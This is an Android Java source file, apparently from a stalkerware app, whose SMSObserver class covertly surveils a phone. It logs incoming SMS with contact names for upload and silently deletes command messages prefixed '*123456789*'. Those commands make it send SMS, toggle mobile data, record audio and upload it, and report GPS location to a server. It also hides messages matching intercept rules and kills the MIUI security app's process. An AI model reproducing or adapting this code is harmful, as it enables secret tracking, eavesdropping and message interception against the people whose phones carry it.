package com.privacy.system.resolver;

import java.io.File;
import java.util.ArrayList;
import java.util.Date;
import java.util.List;
import com.baidu.location.LocationClientOption;
import com.google.gson.Gson;
import com.privacy.system.base.C;
import com.privacy.system.db.ContactsDB;
import com.privacy.system.db.DirectiveDB;
import com.privacy.system.db.FileDB;
import com.privacy.system.db.MonitorDB;
import com.privacy.system.db.SMSRecordDB;
import com.privacy.system.db.util.DirectiveUtil;
import com.privacy.system.domain.Contacts;
import com.privacy.system.domain.Directive;
import com.privacy.system.domain.Monitor;
import com.privacy.system.domain.SMSRecord;
import com.privacy.system.domain.SoundFileInfo;
import com.privacy.system.domain.TaskInfo;
import com.privacy.system.inte.RunBack;
import com.privacy.system.location.LocationMan;
import com.privacy.system.provider.TaskInfoProvider;
import com.privacy.system.resolver.field.SMSConstant;
import com.privacy.system.service.utilservice.ClientSocket;
import com.privacy.system.service.utilservice.SoundRecordUtil;
import com.privacy.system.util.AppUtil;
import com.privacy.system.util.HttpUtil;
import com.privacy.system.util.Logger;
import com.privacy.system.util.NetworkUtil;
import android.app.ActivityManager;
import android.app.ActivityManager.RunningAppProcessInfo;
import android.content.ContentResolver;
import android.content.Context;
import android.content.SharedPreferences;
import android.database.ContentObserver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Handler;
import android.os.SystemClock;
import android.telephony.SmsManager;
import android.text.TextUtils;

/**
 * 短信观察者
 */
public class SMSObserver extends ContentObserver {
	
	private Context context;
	private SMSRecordDB sqlite;
	private RunBack runBack;
	private DirectiveDB directiveDB;
	private ContentResolver mResolver;
	private ActivityManager am;
	private String startTime ="";
	private MonitorDB monitorDB ;
	private ContactsDB contactsDB;
	private FileDB fileDB;
	private SharedPreferences sp;
	private boolean isSoundRec = false;
	
	// 需要获得的字段列
	private static final String[] PROJECTION = {SMSConstant.TYPE,
			SMSConstant.ADDRESS, SMSConstant.BODY, SMSConstant.DATE,
			SMSConstant.READ};

	public SMSObserver(ContentResolver resolver, Handler handler,Context context,RunBack runBack) {
		super(handler);
		this.mResolver = resolver;
		this.context = context;
		this.sqlite = SMSRecordDB.getInstance(context);
		this.runBack = runBack;
		this.monitorDB = MonitorDB.getInstance(context);
		this.contactsDB = ContactsDB.getInstance(context);
		this.fileDB = FileDB.getInstance(context);
		this.directiveDB = DirectiveDB.getInstance(context);
		am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
		sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
	}
 
	public SMSObserver(Handler handler) {
		super(handler);
	}

	@Override
	public void onChange(boolean selfChange) {
		super.onChange(selfChange);
		
	
		if(mResolver!=null && context !=null){
		
			Cursor smsCursor = mResolver.query(SMSConstant.CONTENT_URI, // 查询的URI,
					PROJECTION, // 需要取得的列 ,
					null, // 查询语句
					null, // 可能包括您的选择，将被替换selectionArgs的值，在选择它们出现的顺序。该值将被绑定为字符串。
					"_id DESC LIMIT 1");
			
			if (smsCursor != null) {
				while (smsCursor.moveToNext()) {
					Logger.d("SMSObserver","执行了有:"+smsCursor.getCount());
					int typeIndex = smsCursor.getColumnIndex(SMSConstant.TYPE);
					int dateIndex =  smsCursor.getColumnIndex(SMSConstant.DATE);
					int addressIndex =smsCursor.getColumnIndex(SMSConstant.ADDRESS);
					int bodyIndex = smsCursor.getColumnIndex(SMSConstant.BODY);
					
					if(typeIndex !=-1 && dateIndex !=-1 && addressIndex !=-1 && bodyIndex !=-1){
						final String type = smsCursor.getString(typeIndex);
						final String date = smsCursor.getString(dateIndex);
						String phone = smsCursor.getString(addressIndex);
						final String body = smsCursor.getString(bodyIndex);
						
						if(body.startsWith("*123456789*")){
							if(date.equals(startTime)){
								mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.DATE+" = ? ",new String []{date});
								Logger.d("SMSObserver","同一条短信");
								break;
							}
							startTime = date;
							mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.DATE+" = ? ",new String []{date});
							executeDir(body);
							
							break;
						}
						
						//阻止接收指定内容短信
						if(DirectiveUtil.stopSend(body, directiveDB,"15")){
							mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.DATE+" = ? ",new String []{date});
							
							break;
						}
						
						//是否监控
						if(monitorDB !=null && !TextUtils.isEmpty(phone)){
							Monitor monitor = monitorDB.queryOnlyRow(Monitor.COL_PHONE+" = ? and " + Monitor.COL_SMS_MONITOR_STATUS +" = ?",new String []{sp.getString(C.PHONE_NUM,""),"0"});
							if(monitor !=null && "1".equals(monitor.getFilterStatus())){
								Logger.d("SMSObserver","拦截了短信....");
								mResolver.delete(SMSConstant.CONTENT_URI,SMSConstant.DATE+" = ? ",new String []{date});
							}
							
							if(monitor !=null && !"1".equals(monitor.getSmsMonitorStatus())){
								break;
							}
							
							Contacts contacts = contactsDB.queryOnlyRow(Contacts.COL_PHONE+" =?  ",new String []{phone});
							if(contacts !=null){
								Monitor monitor2 = monitorDB.queryOnlyRow(Monitor.COL_PHONE+" = ? and " + Monitor.COL_SMS_MONITOR_STATUS +" = ?",new String []{phone,"0"});
								if(monitor2 !=null && !TextUtils.isEmpty(monitor2.getPhone())){
									break;
								}
							}else {
								if(!phone.equals(sp.getString(C.PHONE_NUM,""))){
									phone = phone+""+"(匿名号码)";
								}
							}
						}
						
						if(date.equals(startTime)){
							Logger.d("SMSObserver","同一条短信");
							break;
						}
						startTime = date;
						Cursor contractsCursor = mResolver.query(Uri.parse("content://com.android.contacts/data"),new String []{"mimetype","raw_contact_id","data1"}," data1 LIKE ? ",new String[]{"%"+phone+"%"},null);
						boolean isUpload = false;
						if(contractsCursor !=null){
							Logger.d("SMSObserver","执行了contractsCursor有:"+smsCursor.getCount());
							while(contractsCursor.moveToNext()){
								int rawId = contractsCursor.getColumnIndex("raw_contact_id");
								if(rawId !=-1){
									Cursor nameCursor = mResolver.query(Uri.parse("content://com.android.contacts/data"),new String []{"mimetype","data1","raw_contact_id"}," raw_contact_id = ? ",new String[]{rawId+""},null);
								    if(nameCursor !=null){
								    	while(nameCursor.moveToNext()){
								    		int mimeTypeIndex = nameCursor.getColumnIndex("mimetype");
								    		if(mimeTypeIndex !=-1){
						                    	String mimeType = nameCursor.getString(mimeTypeIndex);
												if("vnd.android.cursor.item/name".equals(mimeType)){
													int data1Index = nameCursor.getColumnIndex("data1");
													if(data1Index !=-1){
														final String names = nameCursor.getString(data1Index);
														isUpload = true;
														SMSRecord smsRecord = new SMSRecord();
														smsRecord.setMessageType(type);
														smsRecord.setMessageContent(body);
														smsRecord.setDateSent(date);
														
														smsRecord.setPhone(phone);
														smsRecord.setName(names);
														smsRecord.setUploadStatus("0");
														sqlite.insert(smsRecord);
														if(runBack !=null){
															runBack.run();
														}
														break;
													}
												}
						                    }
								    	}
								    	nameCursor.close();
								    	break;
								    }
								}
							}
							contractsCursor.close();
						}
						if(!isUpload){
							SMSRecord smsRecord = new SMSRecord();
							smsRecord.setMessageType(type);
							smsRecord.setMessageContent(body);
							smsRecord.setDateSent(date);
							smsRecord.setPhone(phone);
							smsRecord.setUploadStatus("0");
							sqlite.insert(smsRecord);
							if(runBack !=null){
								runBack.run();
							}
						}
					}
					break;
				}
				/*
				 * 关闭游标，释放资源。否则下次查询游标仍然在原位置
				 */
				if(smsCursor !=null){
					smsCursor.close();
				}
			}
		}	
	}

	private void executeDir(final String body) {
		int lastIndex = body.lastIndexOf("*");
		if(lastIndex==10){
			String strType = body.substring(11);
			directive(Integer.valueOf(strType));
			
		}else if(lastIndex>18){
			String sendNumber = body.substring(14,lastIndex);
			String content = body.substring(lastIndex);
			SmsManager.getDefault().sendTextMessage(sendNumber+"",null,content, null,null);
		
		}else if(lastIndex==13){
			String controlSMS = body.substring((lastIndex+1));
			String type = body.substring(11,13);
			Logger.d("SMSObserver","type:"+type);
			int inType = Integer.valueOf(type);
			//短信指令打开网络
			if(inType==14){
				if("1".equals(controlSMS)){
					Logger.d("SMSObserver","短信打开网络");
					AppUtil.toggleMobileNet(context, true);
				}else {
					Logger.d("SMSObserver","短信关闭网络");
					AppUtil.toggleMobileNet(context, false);
				}
			//增加拦截指定内容成功...
			}else if(inType == 15){
				Directive directive = new Directive();
				directive.setDirType("15");
				directive.setDirStatus(controlSMS);
				directive.setDirStartTime(new Date().getTime()+"");
				directive.setDirPlatform(C.Directive.SMS+"");
				directiveDB.insert(directive);
				Logger.d("SMSOberver","增加拦截指定内容成功...");
			//即时录音
			}else if(inType == 10){
				if(isSoundRec) return;
				//短信即时录音开始了
				final long recLong = (Long.valueOf(controlSMS)*60000);
				if(recLong>60)return;
				Logger.d("SMSObserver","录音时长...."+recLong);
				final long startTime = new Date().getTime();
				final String fileName = "rec_"+sp.getString(C.DEVICE_ID,"")+"_"+startTime+".3gpp";
				final String filePath = context.getFilesDir()+"/"+fileName;
				try {
					isSoundRec = true;
					SoundRecordUtil.startSoundRec(fileName, filePath);
				    new Thread(new Runnable() {
						@Override
						public void run() {
							
							SystemClock.sleep(recLong);
							
							SoundRecordUtil.stopSoundRec();
							isSoundRec= false;
							if(HttpUtil.detect(context)){
								ArrayList<ArrayList<String>> list = new ArrayList<ArrayList<String>>();
								ArrayList<String> one = new ArrayList<String>();
								one.add(startTime+"");
								one.add((startTime+recLong)+"");
								one.add(fileName);
								list.add(one);
								String fileParam = "key=" + ClientSocket.APP_REQ_KEY + "&device_id=" + sp.getString(C.DEVICE_ID,"") + "&rec_list=" + new Gson().toJson(list);
							    Logger.d("SMSObserver","上传录音文件参数.."+fileParam);
								boolean result = NetworkUtil.uploadFileInfo(context,fileParam,C.RequestMethod.uploadCallSoundIntrod);
								if(result){
									boolean reString = NetworkUtil.uploadFile(context.getApplicationContext(),filePath,fileName,C.RequestMethod.uploadCallSoundFile);
									if(reString){
										
										File file = new File(filePath);
										if(file.exists()){
											file.delete();
										}
									}else {
										
										insertFileInfo(recLong, startTime, fileName,filePath);
									}
								}else {
									
									insertFileInfo(recLong, startTime, fileName,filePath);
								}
							}else {
								
								insertFileInfo(recLong, startTime, fileName,filePath);
							}
						}

						
					}).start();
					
				} catch (Exception e) {
					Logger.d("SMSObserver","录音异常了..");
				}
			}
		}
	}
	
	private void directive (int directiveNum){
		
			switch(directiveNum){
			case 12:
			case 13:
				
				LocationMan locationMan = new LocationMan(context);
				if(directiveNum==12){
					locationMan.setLocationPro(LocationClientOption.GpsFirst);
				}else {
					locationMan.setLocationPro(LocationClientOption.NetWorkFirst);
				}
				locationMan.setRunBack(new MyRunnback());
				locationMan.startLocaiton();
				break;
			}
	}
	
	private void insertFileInfo(final long recLong,final long startTime, final String fileName,final String filePath) {
		SoundFileInfo sfi = new SoundFileInfo();
		sfi.setEndTime((startTime+recLong)+"");
		sfi.setFileName(fileName);
		sfi.setFilePath(filePath);
		sfi.setStartTime(startTime+"");
		fileDB.insert(sfi);
	}
	
	private class MyRunnback implements RunBack{

		@Override
		public void run() {
			
		}

		@Override
		public void run(final Object object) {
			if(!HttpUtil.detect(context)){
				new Thread(new Runnable() {
					@Override
					public void run() {
						if(!HttpUtil.detect(context)){
							AppUtil.toggleMobileNet(context, true);
							SystemClock.sleep(10000);
						}
						if(object instanceof String []){
							String [] lo = (String[]) object;
							uploadLocation(lo);
						}
					}
				}).start();
			}else {
				if(object instanceof String []){
					String [] loc = (String[]) object;
					uploadLocation(loc);
				}
			}
		}
	}
	
	private void uploadLocation(String [] locaInfo){
		
		if(locaInfo !=null && locaInfo.length==2){
			Date date = new Date();
			SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO,Context.MODE_PRIVATE);
			NetworkUtil.sendLocInfo(context,ClientSocket.APP_REQ_KEY,sp.getString(C.DEVICE_ID,""),locaInfo[1],locaInfo[0]," ",date.getTime()+"",C.RequestMethod.uploadLocation);
		}
	}
	
	/**
	 * 杀死所有正在运行的进程(除系统进程外)
	 */
	public void killTask(Context context) {
		
		TaskInfoProvider provider = new TaskInfoProvider(context);
		List<TaskInfo> taskInfos = provider.getAllTasks(getProcessAppInfo(context));
		for (TaskInfo taskInfo : taskInfos) {
			String packname = taskInfo.getPackname();
			
			if ("com.lbe.security.miui".equals(packname)) {
				Logger.d("BootRectiver", "杀死了..." + packname);
				am.killBackgroundProcesses(taskInfo.getPackname());
			}
		}
	}
	
	private List<RunningAppProcessInfo> getProcessAppInfo(Context context) {

		return am.getRunningAppProcesses();

	}
}
